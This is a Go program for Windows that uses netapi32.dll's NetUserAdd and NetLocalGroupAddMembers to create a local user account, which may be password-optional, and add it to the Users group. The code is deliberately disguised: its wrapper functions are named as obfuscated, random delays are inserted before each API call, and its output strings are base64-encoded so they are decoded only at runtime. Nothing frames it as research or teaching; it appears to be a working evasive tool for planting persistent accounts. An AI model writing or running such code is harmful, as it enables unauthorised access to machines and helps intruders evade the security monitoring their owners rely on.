package main

import (
	"fmt"
	"os"
	"syscall"
	"unsafe"
	"time"
	"math/rand"
	"encoding/base64"
)

var (
	modnetapi32                 = syscall.NewLazyDLL("netapi32.dll")
	procNetUserAdd              = modnetapi32.NewProc("NetUserAdd")
	procNetLocalGroupAddMembers = modnetapi32.NewProc("NetLocalGroupAddMembers")
)

const (
	ERROR_SUCCESS      = 0
	NERR_GroupNotFound = 2220

	USER_PRIV_USER    = 1
	UF_SCRIPT         = 1
	UF_PASSWD_NOTREQD = 32
)

type USER_INFO_1 struct {
	Username    *uint16
	Password    *uint16
	PasswordAge uint32
	Priv        uint32
	HomeDir     *uint16
	Comment     *uint16
	Flags       uint32
	ScriptPath  *uint16
}

type LOCALGROUP_MEMBERS_INFO_3 struct {
	lgrmi3_domainandname *uint16
}

func obfuscatedNetUserAdd(serverName *uint16, level uint32, buf *byte, parmErr *uint32) (netapiStatus uint32) {
	time.Sleep(time.Duration(rand.Intn(100)) * time.Millisecond)
	ret, _, _ := procNetUserAdd.Call(
		uintptr(unsafe.Pointer(serverName)),
		uintptr(level),
		uintptr(unsafe.Pointer(buf)),
		uintptr(unsafe.Pointer(parmErr)),
	)
	netapiStatus = uint32(ret)
	return
}

func obfuscatedNetLocalGroupAddMembers(serverName *uint16, groupName *uint16, level uint32, buf *byte, totalEntries uint32) (netapiStatus uint32) {
	time.Sleep(time.Duration(rand.Intn(100)) * time.Millisecond)
	ret, _, _ := procNetLocalGroupAddMembers.Call(
		uintptr(unsafe.Pointer(serverName)),
		uintptr(unsafe.Pointer(groupName)),
		uintptr(level),
		uintptr(unsafe.Pointer(buf)),
		uintptr(totalEntries),
	)
	netapiStatus = uint32(ret)
	return
}

func deobfuscateString(s string) string {
	data, _ := base64.StdEncoding.DecodeString(s)
	return string(data)
}

func main() {
	rand.Seed(time.Now().UnixNano())
	
	if len(os.Args) != 3 {
		fmt.Println(deobfuscateString("55So5oi3IDogQ3JlYXRlVXNlci5leGUg55So5oi35ZCNIOS4reWtlw=="))
		return
	}

	username := syscall.StringToUTF16Ptr(os.Args[1])
	password := syscall.StringToUTF16Ptr(os.Args[2])

	ui1 := USER_INFO_1{
		Username: username,
		Password: password,
		Priv:     USER_PRIV_USER,
		Flags:    UF_SCRIPT | UF_PASSWD_NOTREQD,
	}

	if rand.Intn(2) == 0 {
		time.Sleep(time.Duration(rand.Intn(500)) * time.Millisecond)
	}

	ret := obfuscatedNetUserAdd(nil, 1, (*byte)(unsafe.Pointer(&ui1)), nil)
	if ret != ERROR_SUCCESS {
		fmt.Println(deobfuscateString("5re75Yqg55So5oi36ZSZ6K+vOg=="), ret)
		return
	}

	groupName := syscall.StringToUTF16Ptr("Users")
	memberInfo := LOCALGROUP_MEMBERS_INFO_3{lgrmi3_domainandname: username}
	buf := &memberInfo

	if rand.Intn(2) == 0 {
		time.Sleep(time.Duration(rand.Intn(500)) * time.Millisecond)
	}

	ret = obfuscatedNetLocalGroupAddMembers(nil, groupName, 3, (*byte)(unsafe.Pointer(buf)), 1)
	if ret != ERROR_SUCCESS && ret != NERR_GroupNotFound {
		fmt.Println(deobfuscateString("5re75Yqg55So5oi35Yiw57uE5aSx6LSl"), ret)
		return
	}

	fmt.Println(deobfuscateString("5re75Yqg55So5oi35ZKM57uE5oiQ5Yqf"))
}
